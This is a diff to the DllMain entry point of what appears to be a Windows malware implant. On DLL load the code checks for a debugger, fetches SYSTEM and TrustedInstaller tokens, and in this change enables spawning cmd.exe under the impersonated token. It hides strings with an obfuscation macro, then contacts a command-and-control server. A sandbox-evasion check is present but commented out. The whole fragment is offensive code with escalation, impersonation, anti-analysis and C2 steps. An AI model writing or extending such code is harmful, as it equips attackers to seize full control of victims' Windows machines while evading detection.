@@ -1,5 +1,5 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
-#include "procutils.h"
+#include "procmgr.h"
 #include "syscalls.h"
 #include "client.h"
 #include "net_common.h"
@@ -32,18 +32,17 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 					  LPVOID lpReserved
 )
 {
+	ProcessManager mgr;
+
 	switch ( ul_reason_for_call )
 	{
 	case DLL_PROCESS_ATTACH:		
-		if ( !ProcessUtilities::Init() )
-			return FALSE;
-
-		ProcessUtilities::CheckNoDebugger();
+		mgr.CheckNoDebugger();
 
 		//if ( SandboxCompromise::SuspicousProcRunning() )
-		//	ProcessUtilities::HaltProcessExecution();
+		//	ProcessManager::HaltProcessExecution();
 
-		HANDLE escalatedPriv = ProcessUtilities::GetSystemToken();
+		HANDLE escalatedPriv = mgr.GetSystemToken();
 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));
 		std::wstring wstrCmd = std::wstring(strCmd.begin(), strCmd.end());
 		
@@ -53,19 +52,19 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		STARTUPINFO si = { 0 };
 		PROCESS_INFORMATION pi;
 		
-		HANDLE token = ProcessUtilities::GetTrustedInstallerToken();
+		HANDLE token = mgr.GetTrustedInstallerToken();
 
-		//ProcessUtilities::OpenProcessAsImposter(
-		//	token,
-		//	LOGON_WITH_PROFILE,
-		//	NULL,
-		//	cmd.data(),
-		//	CREATE_NEW_CONSOLE,
-		//	NULL,
-		//	NULL,
-		//	&si,
-		//	&pi
-		//);
+		mgr.OpenProcessAsImposter(
+			token,
+			LOGON_WITH_PROFILE,
+			NULL,
+			cmd.data(),
+			CREATE_NEW_CONSOLE,
+			NULL,
+			NULL,
+			&si,
+			&pi
+		);
 
 		// try to connect to c2 server
 		Client me;
@@ -83,8 +82,6 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		while ( 1 ) {
 			std::this_thread::sleep_for(std::chrono::seconds(1));
 		}
-
-		ProcessUtilities::Clean();
 
 		//// query mac addresses
 
